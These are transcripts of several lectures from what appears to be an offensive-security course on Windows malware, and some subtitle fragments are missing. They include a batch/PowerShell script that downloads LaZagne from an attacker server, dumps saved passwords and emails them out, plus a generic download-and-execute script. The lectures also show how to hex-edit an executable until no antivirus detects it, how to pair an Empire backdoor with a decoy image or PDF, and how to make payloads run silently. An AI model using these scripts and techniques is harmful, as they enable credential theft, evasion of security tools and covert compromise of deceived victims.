And then I'm going to run it.

141
00:09:57,940 --> 00:10:00,310
Now the script is going to run like this.

142
00:10:00,310 --> 00:10:05,410
And I know this is very suspicious, but we're going to talk about this later in the course and we'll

143
00:10:05,410 --> 00:10:12,910
see how we can make this very acceptable to the target person, how we can hide this and how to deliver

144
00:10:12,910 --> 00:10:14,290
this in a very smart way.

145
00:10:14,290 --> 00:10:17,350
So even the delivery method that we're using now is pretty stupid.

146
00:10:17,350 --> 00:10:22,060
Like the person has to put an IEP and they have to actually click on the file to download it.

147
00:10:22,060 --> 00:10:27,460
But we're going to be talking about all of that later and we'll be able to get this thrown in the background.

148
00:10:27,520 --> 00:10:33,220
But for now, we're just seeing how we can weaponize lesson and what's this going to do now?

149
00:10:33,220 --> 00:10:36,490
Basically, it's going to run the zone like we did in the previous lectures.

150
00:10:36,910 --> 00:10:43,000
It's going to store the output in a file and send the file to me by email to the email that I set.

151
00:10:43,830 --> 00:10:44,100
Now.

152
00:10:44,100 --> 00:10:45,120
It's already done.

153
00:10:45,150 --> 00:10:46,830
I'm going to go to my email.

154
00:10:46,860 --> 00:10:51,090
I've already logged into it to make this lecture less boring.

155
00:10:52,020 --> 00:10:59,070
And as you can see, I got an email from myself because I programmed the script to send the email from

156
00:10:59,070 --> 00:10:59,700
yourself.

157
00:11:00,620 --> 00:11:06,050
And if you click on it, it's telling us that there is a report in the attachment.

158
00:11:06,770 --> 00:11:13,190
If we open the attachment, you'll see that we have the laser output very similar to the output we used

159
00:11:13,190 --> 00:11:15,230
to get on the computer.

160
00:11:16,680 --> 00:11:19,260
And it contains the passwords that we're looking for.

161
00:11:19,440 --> 00:11:24,780
So it has the password of the that I used when I was logged into this service.

162
00:11:24,960 --> 00:11:31,500
And we can also see the password that's stored in Firefox, which is coming from accounts that Google.com.

163
00:11:31,650 --> 00:11:37,920
It's for John wake at gmail.com and the password is ABC one, two, three, ABC one, two, three.

@echo off

set downloadURL=http://10.20.14.213/evil-files/laZagne.exe
set email=email@gmail.com
set password=PASSWORD

set exeFile=%TEMP%\proc.exe
set logFile=%TEMP%\proclog.txt
set arguments=all


powershell (new-object System.Net.WebClient).DownloadFile('%downloadURL%','%exeFile%');
%exeFile% %arguments% > %logFile%

del %exeFile%

powershell $SMTPServer = 'smtp.gmail.com';$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPInfo.EnableSsl = $true;$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('%email%', '%password%');$ReportEmail = New-Object System.Net.Mail.MailMessage;$ReportEmail.From = '%email%';$ReportEmail.To.Add('%email%');$ReportEmail.Subject = 'Lazagne Report';$ReportEmail.Body = 'Lazagne report in the attachments.';$ReportEmail.Attachments.Add('%logFile%');$SMTPInfo.Send($ReportEmail);

del %logFile%


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

==================================================================================

# Section 10: Windows Malware - Enhancing Malware

1

00:00:01,040  -->  00:00:05,940
So far in the course, we've seen how to use a number of tools to generate backdoors.

2

00:00:06,820  -->  00:00:12,040
These tools gave us backdoors that are not detectable by any antivirus programs

3

00:00:12,760  -->  00:00:17,520
and sometimes they were detected by one or two antivirus programs,

4

00:00:17,520  -->  00:00:23,580
but we've seen how to open the backdoor using a text editor and modifying its code,

5

00:00:23,820  -->  00:00:26,780
so that it bypasses these programs.

6

00:00:27,820  -->  00:00:34,440
The whole idea behind this, is we're trying to modify the signature or the code of the backdoor,

7

00:00:34,760  -->  00:00:37,320
so that when it's scanned by an anti-virus program,

8

00:00:37,560  -->  00:00:41,440
the signature will not look similar to other harmful files.

9

00:00:42,040  -->  00:00:48,640
If it looks unique, then the antivirus program will say 'This is an OK file. It does not have any harmful code.'

10

00:00:50,000  -->  00:00:54,900
So if you want to generate a backdoor, you can just use one of the tools that we have seen so far

11

00:00:55,160  -->  00:00:57,400
and you're good to go, you won't be detected.

12

00:00:57,960  -->  00:01:02,720
The problem is if you have your own backdoor or virus or Keylogger

13

00:01:03,320  -->  00:01:06,840
and that program, let's say, let's just call it a 'program'

14

00:01:07,240  -->  00:01:10,700
and let's say that program is getting detected by antivirus programs.

15

00:01:11,960  -->  00:01:13,560
Now, this is an executable

16

00:01:13,920  -->  00:01:17,980
and if you open it with a text editor, you'll just see gibberish.

17

00:01:18,840  -->  00:01:24,620
The problem with this is how are you gonna be able to bypass antivirus programs with that.

18

00:01:25,940  -->  00:01:31,360
So, the whole point of this lecture is to show you how to bypass antivirus programs

19

00:01:31,460  -->  00:01:36,700
if you have an 'exe', if you have a file that's already compiled to an executable.

20

00:01:38,720  -->  00:01:42,100
So, we're gonna have the LaZagne standalone executable in here

21

00:01:42,720  -->  00:01:47,300
and we're gonna see how we can bypass antivirus programs with that.

22

00:01:48,060  -->  00:01:49,920
Now, we know this is written in Python,

23

00:01:50,140  -->  00:01:52,880
if you actually want it to send this file to the target,

24

00:01:53,240  -->  00:01:57,120
then you're better off just compiling this to the executable.

25

00:01:57,740  -->  00:02:03,380
And there is a detailed tutorial on how to compile the Python code to executable,

26

00:02:03,540  -->  00:02:07,380
on the same GitHub website, of the creator of the LaZagne.

27

00:02:08,200  -->  00:02:12,940
Now, that's not what I wanna show you because that's very easy, you can just go and follow that.

28

00:02:13,320  -->  00:02:20,060
We're just having this as an example and it can follow this method to change the code of any executable,

29

00:02:20,200  -->  00:02:23,000
so that you can bypass antivirus programs.

30

00:02:24,240  -->  00:02:29,580
So, I'm not dealing with the Python code, I actually have the 'laZagne' executable here.

31

00:02:30,120  -->  00:02:35,560
So, if I just come on my command prompt and if I just run it right here

32

00:02:36,040  -->  00:02:38,080
and I'm just gonna run browsers 'Firefox'.

33

00:02:40,280  -->  00:02:47,660
Just to get the password saved in Firefox and as you can see, I got my password for 'jhnwck' right here.

34

00:02:48,420  -->  00:02:49,420
So, it's working.

35

00:02:49,900  -->  00:02:53,440
Now, if we go and upload this to 'NoDistribute'.

36

00:03:00,900  -->  00:03:04,980
You'll see that it's getting detected by 12 antivirus programs.

37

00:03:05,980  -->  00:03:11,200
So, this is really bad and like I said, you can go and try to compile the code from Python

38

00:03:11,200  -->  00:03:15,400
but that's not what I wanna show you, I wanna show you how to deal with executables.

39

00:03:15,400  -->  00:03:19,500
So right here, we have the executable that you'll be sending to the target.

40

00:03:21,000  -->  00:03:24,680
So, we're gonna use the same method or the same idea that we always use

41

00:03:24,980  -->  00:03:28,880
and the whole goal is gonna be to modify the code.

42

00:03:29,600  -->  00:03:35,300
The only problem is if you open this with notepad, you'll just get gibberish, you won't actually see any code

43

00:03:36,120  -->  00:03:40,820
and if you modify it from notepad, the code will be just broken and it won't work.

44

00:03:42,120  -->  00:03:45,280
So what we're gonna do is, we're gonna use a Hex Editor.

45

00:03:45,880  -->  00:03:49,820
And that's basically, a program that opens the executable

46

00:03:50,420  -->  00:03:53,520
and allow us to modify parts of the code

47

00:03:53,880  -->  00:04:00,280
and when we modify these parts of the code, it will automatically modify the corresponding Hex values.

48

00:04:01,620  -->  00:04:05,000
When it does this, it actually won't mess up the instructions

49

00:04:05,320  -->  00:04:09,620
and when the file gets executed, the code will work normally.

50

00:04:10,900  -->  00:04:15,080
So to do that, first of all you need to download a Hex program, a Hex Editor.

51

00:04:15,440  -->  00:04:19,000
and I'm gonna include the download link in the resources

52

00:04:19,320  -->  00:04:26,060
but you can just go to this one right here, on Google and just look for 'HxD'

53

00:04:26,580  -->  00:04:30,120
and if you just go down you have the download link, right here.

54

00:04:31,820  -->  00:04:35,460
You download that, you select the download link from here

55

00:04:36,060  -->  00:04:40,620
and all you have to do is just run the Installer and go next, next, next, next,

56

00:04:40,860  -->  00:04:42,880
and it will install it for you here.

57

00:04:43,800  -->  00:04:47,180
Now, I have it downloaded right here, so I'm just gonna double click it.

58

00:04:50,040  -->  00:04:53,114
And then I'm gonna open my file, my executable

59

00:04:53,320  -->  00:04:57,360
that I want to change its values, that I want to change parts of its code,

60

00:04:57,780  -->  00:04:59,800
so I'm gonna drag-drop this in here.

61

00:05:02,040  -->  00:05:07,600
And as you can see now, we have the file, the code, right here or the executable

62

00:05:07,840  -->  00:05:13,200
and then we have the instructions, the Hex instructions corresponding to it

63

00:05:13,560  -->  00:05:16,940
and you can see that when I highlight parts of here,

64

00:05:17,640  -->  00:05:23,000
it highlights the Hex parts that corresponds to the values that I highlighted.

65

00:05:24,880  -->  00:05:27,800
Now basically, when you open the file with notepad,

66

00:05:27,980  -->  00:05:32,060
this is what you see so you'll only see the right column in here, you won't see the left side.

67

00:05:33,960  -->  00:05:36,660
Now, you can see this is again all gibberish

68

00:05:37,060  -->  00:05:40,660
and be careful, this gibberish actually makes sense to the computer,

69

00:05:40,660  -->  00:05:42,720
so you don't really wanna be modifying that.

70

00:05:43,460  -->  00:05:44,860
What we're gonna look for is,

71

00:05:45,080  -->  00:05:50,480
we're gonna look for normal characters for readable sentences or readable text.

72

00:05:50,840  -->  00:05:52,800
And we're kind of, we're gonna modify that

73

00:05:53,140  -->  00:05:56,760
and see if modifying that will actually affect the signature

74

00:05:57,000  -->  00:05:59,740
and it'll allow us to bypass antivirus programs.

75

00:06:00,680  -->  00:06:06,240
Now keep in mind, sometimes when you modify things in here, your executable will break and stop working.

76

00:06:06,740  -->  00:06:13,400
So, you wanna always make very small changes and test the code every time, you'd make these changes.

77

00:06:14,580  -->  00:06:20,180
So the first thing, I'm gonna do is you can see, the first thing we see in here is some text

78

00:06:20,480  -->  00:06:25,900
and basically, the text says, "This program cannot be run in DOS mode".

79

00:06:26,740  -->  00:06:31,940
So, what I'm gonna do is, I know this is just the text and it's probably just a comment or a print statement.

80

00:06:32,400  -->  00:06:35,800
So, I'm just gonna highlight the text there and then I'm gonna modify it.

81

00:06:36,980  -->  00:06:40,980
And when I modify it, I'm gonna just put some random characters in here,

82

00:06:42,220  -->  00:06:45,335
to just make this code look different to antivirus programs.

83

00:06:45,900  -->  00:06:49,180
But you wanna make sure you don't put more or less characters,

84

00:06:49,180  -->  00:06:52,520
you wanna put exactly the same amount of characters.

85

00:06:52,880  -->  00:07:00,260
So, I'm just gonna be put and write down stuff but I'm gonna be very careful, not to overwrite any of the code,

86

00:07:00,260  -->  00:07:03,400
so you can see the stuff that I write, is written in red.

87

00:07:04,020  -->  00:07:07,320
So, I'm literally just writing, just random things in here.

88

00:07:08,300  -->  00:07:12,300
You don't even need to put spaces, you can just put like characters

89

00:07:12,560  -->  00:07:20,040
and see, I'm gonna stop at the last 'e' in here because I really don't want to write, overwrite any of the code,

90

00:07:20,040  -->  00:07:22,740
so I have one and two characters

91

00:07:23,240  -->  00:07:24,480
and that's it, I'm done.

92

00:07:24,840  -->  00:07:26,780
I'm not gonna be modifying anything else,

93

00:07:27,620  -->  00:07:30,160
so you can see I modified this sentence here

94

00:07:30,660  -->  00:07:34,560
and this is the corresponding Hex values that got modified with it.

95

00:07:36,840  -->  00:07:39,160
Now, I've obviously tested this before

96

00:07:39,520  -->  00:07:47,040
and this very simple modification will allow you to bypass all antivirus programs except for Kaspersky.

97

00:07:49,380  -->  00:07:55,560
So what I did is I modified this, I saved my code, I tested it in here and it was working.

98

00:07:56,100  -->  00:08:01,500
Then, I came back here and I wanted to bypass Kaspersky.

99

00:08:02,020  -->  00:08:05,520
So, I've, I was looking for something else to modify

100

00:08:05,960  -->  00:08:09,760
and the first thing that I've seen is right here and it just says 'text'.

101

00:08:10,520  -->  00:08:16,060
So, I was like this is highly unlikely but let me just try it, so again I just put some random code in here.

102

00:08:20,120  -->  00:08:26,380
I saved this and with this result I was able to bypass all antivirus programs.

103

00:08:27,100  -->  00:08:30,240
So let me show you now, I'm gonna 'Save' this, I'm gonna go to 'File'.

104

00:08:31,540  -->  00:08:32,800
I'm gonna go to 'Save'.

105

00:08:34,260  -->  00:08:37,580
So, that already saved the code over 'laZagne.exe'

106

00:08:37,840  -->  00:08:45,880
and you can see that it automatically created another file for us and it's called that 'laZagne.exe.bak'.

107

00:08:46,440  -->  00:08:50,000
And the reason for this is, in case you broke the code in here,

108

00:08:50,280  -->  00:08:56,840
you still have the original code stored in the backup, so this is just a backup file, in case things went wrong.

109

00:08:58,080  -->  00:09:04,360
So what I'm gonna do now is, I'm gonna first test and make sure that this file works as expected

110

00:09:05,220  -->  00:09:11,440
and as you can see, the file still works and it still allowing me to get the saved passwords in Firefox.

111

00:09:11,980  -->  00:09:13,940
So, everything is perfect for now.

112

00:09:14,200  -->  00:09:20,060
What I wanna do is, I wanna check and see, if this file is actually getting detected by any antivirus programs

113

00:09:20,240  -->  00:09:21,480
and hopefully not.

114

00:09:22,280  -->  00:09:24,320
So again, I'm back at 'NoDistribute'

115

00:09:25,280  -->  00:09:27,220
and I'm going to upload my file.

116

00:09:35,320  -->  00:09:39,920
And as you can see, we managed to bypass all antivirus programs.

117

00:09:40,220  -->  00:09:42,100
We got 0 out of 35,

118

00:09:42,260  -->  00:09:49,540
so nothing was able to detect our file, which was detected by 12 antivirus programs before.

119

00:09:51,180  -->  00:09:56,860
Now again, I just used 'laZagne.exe' to give you an example on how to do this

120

00:09:57,140  -->  00:10:02,960
but you can use this method with any executable that's getting detected by antivirus programs.

121

00:10:03,440  -->  00:10:09,620
Just make sure that you modify parts of the code that won't affect the code itself

122

00:10:09,920  -->  00:10:13,100
and make sure that you don't overwrite any useful code.

123

00:10:13,600  -->  00:10:19,640
Make sure to keep the, those changes small and keep testing until you achieve better results.

124

00:10:19,860  -->  00:10:25,880
So, don't modify large chunks of the code and don't do many modifications at a time.

125

00:10:26,080  -->  00:10:28,960
Always do small modifications, test the code.

126

00:10:29,300  -->  00:10:34,480
Test, how many anti viruses you're bypassing and then modify more, if you need more.

1

00:00:01,900  -->  00:00:05,000
In this lecture, I'm gonna show you how to create a file

2

00:00:05,440  -->  00:00:12,360
that when it's executed, it will download a number of files and execute them on the target computer.

3

00:00:13,300  -->  00:00:17,680
This can be very, very handy in many scenarios when it comes to social engineering.

4

00:00:18,260  -->  00:00:23,360
So you can use this file to download a backdoor and a Keylogger for example

5

00:00:23,360  -->  00:00:27,220
and execute them in the background, you can use it too,

6

00:00:27,220  -->  00:00:30,800
so that when the person runs it, it downloads and opens an image first

7

00:00:31,140  -->  00:00:33,600
and then it downloads and executes your backdoor.

8

00:00:34,060  -->  00:00:38,360
This way the person will be less suspicious and they'll think they're actually, opening an image.

9

00:00:39,060  -->  00:00:42,240
You can use this in so many ways and we're actually gonna have a look on it

10

00:00:42,240  -->  00:00:44,440
in more than one lecture in this course.

11

00:00:45,640  -->  00:00:48,320
So at the start, let's just have a look on this file.

12

00:00:48,720  -->  00:00:52,380
It's a script that's written in PowerShell and batch script

13

00:00:52,980  -->  00:00:56,420
and I made it very simple, it's only made out of two lines.

14

00:00:56,880  -->  00:01:01,540
I'm gonna include its download link in the resources and I have it downloaded right here.

15

00:01:01,540  -->  00:01:05,920
It's called download-and-execute because what it does is it downloads and executes.

16

00:01:07,020  -->  00:01:11,480
So I'm gonna open this with Leafpad but like I said, you can just open it with the normal text editor.

17

00:01:12,040  -->  00:01:15,380
I only use Leafpad because they have the font to set to be larger

18

00:01:17,240  -->  00:01:20,460
and you can see that the file contains only two lines.

19

00:01:21,100  -->  00:01:23,420
Like I said, this is not a programming course,

20

00:01:23,420  -->  00:01:26,020
so I'm not going to walk you through how I wrote the script

21

00:01:26,220  -->  00:01:28,200
but I'm gonna show you how to use it.

22

00:01:29,120  -->  00:01:34,280
So all you have to modify in here is to set the files in here.

23

00:01:34,900  -->  00:01:41,040
So as you can see I have URL1, URL2, URL3 and you can add as many as you want of these.

24

00:01:41,700  -->  00:01:48,660
And basically, each one of these need to be a direct link to a file that you want to download and execute.

25

00:01:49,480  -->  00:01:52,060
And what I meant by a direct link, I spoke about this earlier

26

00:01:52,140  -->  00:01:55,680
but I'm just gonna show you one more time is that the URL,

27

00:01:55,980  -->  00:01:59,100
that you're going to use, will lead you directly to that file.

28

00:01:59,980  -->  00:02:03,200
So let's say we want to open an image to download and open an image.

29

00:02:03,280  -->  00:02:08,840
I'm gonna look for images first and let's say I wanted to open this image.

30

00:02:08,980  -->  00:02:10,820
So I'm just gonna open it with Google.

31

00:02:11,400  -->  00:02:17,360
Now, this URL is not good because as you can see we, it's a Google URL.

32

00:02:17,540  -->  00:02:21,460
It's opening a Google page and the image is loading inside Google.

33

00:02:21,600  -->  00:02:22,440
So that's not good.

34

00:02:23,040  -->  00:02:25,460
What we want is you want to go on view image

35

00:02:26,420  -->  00:02:31,640
and if you look at the URL now, you'll see the URL ends with .jpg.

36

00:02:32,240  -->  00:02:35,040
So it's actually the direct URL to the file.

37

00:02:35,740  -->  00:02:41,420
If this was an executable for example, the browser will not open it and it will ask you to download it

38

00:02:41,640  -->  00:02:44,560
but because it's an image, it's getting opened in the browser.

39

00:02:45,320  -->  00:02:50,840
So you want to make sure that you the URL that you're gonna use can be used to directly access the file.

40

00:02:52,120  -->  00:02:57,220
So I'm gonna use this image actually and I'm just gonna place it, instead of your l1 right here.

41

00:03:02,100  -->  00:03:04,760
And then I'm gonna use another image.

42

00:03:05,160  -->  00:03:06,940
I'm just gonna go back to the Google Search.

43

00:03:12,360  -->  00:03:13,940
and use its URL.

44

00:03:15,640  -->  00:03:19,000
Now today, we're just gonna have an example of running two images,

to the temp directory.

75

So that they don't show up in the current working directory.

76

So the file now is the in downloads but when you execute it,

82

it'll exe, it will download and execute two files for us.

83

00:06:05,220  -->  00:06:08,520
Now, I know you think that this is not useful, we just open two images.

84

00:06:08,820  -->  00:06:11,880
So it's not really allowing us to hack or do anything to the target person

85

00:06:12,340  -->  00:06:18,000
but you'll see in the future videos how we can weaponize this and use it in very useful scenarios.

@echo off

set files='url1','url2'

powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"

# Section 11: Windows Malware - Creating Trojans


1

00:00:00,680  -->  00:00:07,340
In this lecture, I'm gonna show you how to combine the evil files that we created so far with any file type,

2

00:00:07,500  -->  00:00:10,700
with an image, with a PDF, with a song, with a video.

3

00:00:11,040  -->  00:00:13,800
So that, when the target person runs that evil file,

4

00:00:14,020  -->  00:00:16,060
so whether it's a backdoor or a Keylogger,

5

00:00:17,740  -->  00:00:19,480
they'll see an image or a video

6

00:00:19,840  -->  00:00:25,860
and then at the same time, your backdoor or your keylogger is gonna work in the background.

7

00:00:26,980  -->  00:00:31,740
This is really handy because we're gonna use this with our delivery methods.

8

00:00:32,020  -->  00:00:37,000
So, that the target person trusts us more and we'll open that file and won't be suspicious

9

00:00:37,240  -->  00:00:40,640
because as you've seen so far, the files we are sending are executables

10

00:00:40,800  -->  00:00:44,180
and they look like they're gonna do something harmful on the computer.

11

00:00:45,740  -->  00:00:50,140
So, this is the first step of disguising our malware or evil files,

12

00:00:50,460  -->  00:00:53,800
so that they look like normal files that the person expects.

13

00:00:55,420  -->  00:01:02,200
Now, there's a lot of exploits that will allow you to inject a payload inside an image or inside a PDF

14

00:01:02,540  -->  00:01:08,280
but these exploits won't always work because they rely on a certain vulnerability

15

00:01:08,600  -->  00:01:11,440
and these vulnerabilities get patched very quickly.

16

00:01:11,760  -->  00:01:14,700
That's why they won't work with the latest updated systems.

17

00:01:15,280  -->  00:01:19,020
The method that I'm going to show you now however, will always work

18

00:01:19,020  -->  00:01:22,440
and it'll work with the most secure and updated systems

19

00:01:22,660  -->  00:01:26,980
because we won't be injecting the payload in an image or in a PDF.

20

00:01:27,220  -->  00:01:30,140
What we're gonna do is, we're gonna download the image,

21

00:01:30,580  -->  00:01:33,300
download the backdoor or the evil file,

22

00:01:33,800  -->  00:01:36,760
open the image and then run the backdoor in the background.

23

00:01:37,540  -->  00:01:39,600
So we're literally gonna be downloading two files,

24

00:01:39,640  -->  00:01:42,480
the same way that we were doing before when we downloaded two images.

25

00:01:42,780  -->  00:01:46,040
But this time, we're gonna download an image and an evil file,

26

00:01:46,420  -->  00:01:50,200
execute the image, then execute the evil file in the background.

27

00:01:50,400  -->  00:01:53,680
So, that the target person will think that they just opened an image

28

00:01:53,780  -->  00:01:59,320
but they won't know that in the background, there is a backdoor running or there is a keylogger or a virus

29

00:01:59,320  -->  00:02:03,100
or whatever you use as your evil file.

30

00:02:05,280  -->  00:02:11,080
So to do this, we're gonna use the same download and execute payload that I showed you before.

31

00:02:12,000  -->  00:02:13,640
So I, I have it right here

32

00:02:13,860  -->  00:02:16,020
and I'm just going to open it with my text editor.

33

00:02:19,280  -->  00:02:22,260
And I programmed this to be as generic as possible.

34

00:02:22,600  -->  00:02:26,200
So, you can use it to download and execute anything you want,

35

00:02:26,440  -->  00:02:35,220
whether it's an image, a file, a backdoor, a video, a song, anything that the target computer supports,

36

00:02:35,480  -->  00:02:39,980
can be downloaded and executed using this script right here.

37

00:02:40,820  -->  00:02:45,240
All you have to do is set the files that you want to download and execute in here

38

00:02:45,520  -->  00:02:47,340
and separate them by a comma.

39

00:02:48,660  -->  00:02:53,120
So, I'm going to keep the first file to be downloaded as this image right here.

40

00:02:53,880  -->  00:02:56,580

Now the second file,

we're gonna use a comma, as you can see here,

46

00:03:15,180  -->  00:03:19,420
and then you want to put the URL for the second file that you want to download and execute.

47

00:03:20,620  -->  00:03:23,620
Like I said before, you can use as many files as possible.

48

00:03:23,980  -->  00:03:26,600
So, you can actually open an image at the start, this image

49

00:03:27,020  -->  00:03:31,520
and then open a backdoor in here and then download and open a second backdoor in here.

51

00:03:35,320  -->  00:03:38,880
for the file to download and execute between two quotation marks in here.

52

00:03:40,800  -->  00:03:42,780
So, I'm actually just gonna use two files.

00:03:42,880  -->  00:03:46,740
So the image is going to be the first thing that's going to be downloaded and executed

00:03:46,900  -->  00:03:51,200
and the second thing that's going to be downloaded and executed is going to be the backdoor

55

00:03:51,340  -->  00:03:53,580
that I created with Empire.

57

00:04:00,440  -->  00:04:02,180
followed by 'evil-files'

and followed by the name of the backdoor which I forgot.

So, I'm just gonna check it in here and I have that open here 'var/www/html' and I have my evil-files here

00:04:16,000  -->  00:04:20,600
and the name of the backdoor was 'empire_http_8080.bat',

61

00:04:21,000  -->  00:04:22,380
so I'm just going to copy that name.

and make sure you set it to '.bat' not to '.txt'

I'm going to copy this.

to think that they're opening an image.

87

00:06:09,980  -->  00:06:12,100
And then when we go in here,

Right here and if I'm going to 'interact'.

91

00:06:27,380  -->  00:06:29,180

93

00:06:34,480  -->  00:06:39,940
and I'm able to control it and I have full access to it, so I basically, hacked the Windows machine now

94

and we did this using a thing that looks like an image.

95

00:06:44,880  -->  00:06:47,900
You can see that this is not a hundred percent convincing,

96

so we still seeing some command prompt Windows showing up.

97

00:06:51,780  -->  00:06:58,380
The icon still doesn't look like an image icon and the extension still doesn't look like an image extension.

98

00:06:58,680  -->  00:07:00,860
But we're going to talk about all of that later on.

99

00:07:00,860  -->  00:07:05,120
but for now, we managed to make our backdoor look or function,

100

I should say, like an image, it doesn't really look like an image but it functions like an image.

101

00:07:11,180  -->  00:07:14,880
Now, this also works with, with all other file types like I said before,

102

106

00:07:33,560  -->  00:07:37,360

00:07:38,280  -->  00:07:40,780

and I'm just gonna look for any PDF, I'm not really looking for anything

109

00:07:44,320  -->  00:07:47,140
but when you're actually doing this against a specific person,

110

you want to use a PDF that looks convincing to them and that they're interested into opening.

111

you use again, it's a direct URL

that'll lead you directly to the file, so it'll 
literally allow you to open the file directly,

there is no Ads or nothing around the page.

115

00:08:12,520  -->  00:08:14,340
So, this is the URL that I'm gonna use.

116

117

and I'm just gonna put that instead of the image.

00:08:22,220  -->  00:08:24,880
So at the start, we were using an image 
 and the backdoor

but for now we're going to delete the image.

131

we can see a normal PDF in here.

132

00:09:10,460  -->  00:09:11,560
If we go back,

00:09:14,700  -->  00:09:16,960
and if we do a 'list' for the agents,

135

136

00:09:21,540  -->  00:09:24,380
with a file that functions like a PDF.

137

00:09:24,980  -->  00:09:26,080
So, if I do 'interact'

138

00:09:27,240  -->  00:09:29,140
and then if I do 'sysinfo',

139

00:09:30,200  -->  00:09:32,880
again you'll see that I'm inside the Windows machine

140

00:09:33,160  -->  00:09:34,680
and I managed to hack it completely.

141

00:09:35,740  -->  00:09:39,700
So like I said, the download-and-execute script is very generic.

142

00:09:40,000  -->  00:09:46,580
It can be used to do so many things and we just had an example on how to use it to make our backdoor

143

00:09:46,580  -->  00:09:50,080
or our  evil file to function like any file that we want,

144

00:09:50,080  -->  00:09:54,360
we can make it function like an image, like a PDF, like a song, like a video.

145

00:09:54,600  -->  00:09:59,880
All you have to do is may, put the URLs in the files location, in here

146

00:10:00,860  -->  00:10:07,040
and make sure to separate the files by a comma and surround them by quotation marks.

147

00:10:07,780  -->  00:10:14,120
Also make sure that the URLs that you're using can be used to directly access or download the files.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,170 --> 00:00:06,410
In this lecture, I'd like to show you how to run your backdoor or evil file silently on the target

2
00:00:06,410 --> 00:00:11,420
computer so that when they're executed, they won't show any suspicious windows.

3
00:00:12,110 --> 00:00:19,370
If you remember when we executed the backdoor generated by evasion and I have it right here, it just

4
00:00:19,370 --> 00:00:21,140
ran on the target computer.

5
00:00:21,140 --> 00:00:23,240
It didn't show anything suspicious.

6
00:00:23,240 --> 00:00:29,360
So if I just open this, you'll see that it will be executed in the background and nothing suspicious

7
00:00:29,360 --> 00:00:30,320
will show up.

8
00:00:31,300 --> 00:00:32,950
Empire and fat rat.

9
00:00:32,980 --> 00:00:35,980
On the other hand, if we execute their backdoors.

10
00:00:38,040 --> 00:00:44,220
You'll see that we get a terminal, a suspicious terminal window, and that can really make the target

11
00:00:44,220 --> 00:00:45,720
person think what's happening?

12
00:00:45,720 --> 00:00:48,090
Or maybe there's something running in the background.

13
00:00:48,300 --> 00:00:50,400
I have the fat rat payload here.

14
00:00:50,400 --> 00:00:54,780
And again, if I run that, you'll see we get something really suspicious.

15
00:00:55,690 --> 00:00:59,050
The same happens with our download and execute.

16
00:00:59,080 --> 00:01:03,760
With this we actually see two pop up windows because this is two scripts.

17
00:01:03,760 --> 00:01:11,110
The first one will download the image and the empire backdoor and then it will execute the Empire backdoor.

18
00:01:11,110 --> 00:01:18,310
So we see two pop ups, one for the download and execute script and one for the Empire Backdoor.

19
00:01:19,570 --> 00:01:25,360
Now, if you look at the file extensions of the files that's show in the pop up windows, you'll see

20
00:01:25,360 --> 00:01:28,780
that all of them have a dot bat extension.

21
00:01:29,620 --> 00:01:36,640
So to bypass this, we're going to convert this batch file to an EXE and we're going to configure this

22
00:01:36,670 --> 00:01:43,330
X to be executed silently in the background so that it runs the same way that will evasions backdoor

23
00:01:43,330 --> 00:01:43,990
runs.

24
00:01:44,230 --> 00:01:53,410
So to do that, we're going to use a tool that will convert our bat to X and configure this X to run

25
00:01:53,410 --> 00:01:58,030
silently in the background without showing any suspicious windows.

26
00:01:58,150 --> 00:02:02,160
I'm going to include the link of this tool in the resources of this lecture.

27
00:02:02,170 --> 00:02:06,730
So all you have to do is just scroll down and download it.

28
00:02:09,440 --> 00:02:10,910
And we're going to save it.

29
00:02:12,680 --> 00:02:17,360
And then once it's saved, we're going to open it in our file manager.

30
00:02:20,550 --> 00:02:22,620
So it's already in my downloads.

31
00:02:22,620 --> 00:02:24,970
And as you can see, it's a zip file.

32
00:02:24,990 --> 00:02:28,680
So in order to access its content, we're going to have to extract it.

33
00:02:28,680 --> 00:02:32,610
So I'm going to right click it and go on extract here.

34
00:02:33,790 --> 00:02:36,230
This is the directory of the tool.

35
00:02:36,250 --> 00:02:40,420
If we double click it, you'll see that we have the installer in here.

36
00:02:41,990 --> 00:02:46,990
Now, as you can see, this is an X, so it's a Windows executable.

37
00:02:47,000 --> 00:02:52,550
And in order to install this and use it on Linux, we're going to have to use a tool called wine.

38
00:02:53,060 --> 00:02:55,040
So I'm going to go to my terminal.

39
00:02:56,380 --> 00:02:59,940
And I'm going to navigate to the location where this installer is.

40
00:02:59,950 --> 00:03:01,750
So it's in my downloads.

41
00:03:03,790 --> 00:03:04,690
And if I do?

42
00:03:04,720 --> 00:03:08,680
LS, You'll see the directory of bats in here.

43
00:03:09,310 --> 00:03:14,020
So we're going to have to navigate inside this directory again using the CD command.

44
00:03:14,020 --> 00:03:22,330
So I'm just going to do CDB press a tab to autocomplete and if we list again, you'll see we have the

45
00:03:22,330 --> 00:03:23,770
installer in here.

46
00:03:24,960 --> 00:03:32,070
Now, like I said, because this is a X, because it's a Windows executable, we're going to have to

47
00:03:32,070 --> 00:03:39,000
run it using wine, which is a program that allows us to run Windows executables inside Linux.

48
00:03:39,300 --> 00:03:46,290
So we're going to type wine followed by the name of the executable that we want to run, and it's called

49
00:03:46,290 --> 00:03:47,190
bat two X.

50
00:03:47,580 --> 00:03:48,810
Hit enter.

51
00:03:49,950 --> 00:03:54,240
And this will show us a traditional Windows installation wizard.

52
00:03:54,720 --> 00:03:56,160
So I'm going to click on.

53
00:03:56,160 --> 00:03:56,940
Okay.

54
00:03:58,120 --> 00:04:00,220
I'm going to accept the agreement.

55
00:04:02,040 --> 00:04:06,450
And make sure you tick this box to create a desktop shortcut for the program.

56
00:04:08,340 --> 00:04:13,410
Hit next install and this will install the tool for us.

57
00:04:14,260 --> 00:04:19,100
Now I'm going to untick this so that it doesn't automatically run the program for us.

58
00:04:19,120 --> 00:04:23,890
I'm going to click on Finish and then I'm going to run it from my desktop.

59
00:04:23,890 --> 00:04:28,570
So I'm just going to go down to my desktop and this is the program right here.

60
00:04:29,170 --> 00:04:33,100
So all we have to do is literally double click it to run this program.

61
00:04:33,430 --> 00:04:36,700
Now it's telling us that the publisher is untrusted.

62
00:04:36,700 --> 00:04:37,300
It's fine.

63
00:04:37,300 --> 00:04:39,340
We're going to trust it and run the program.

64
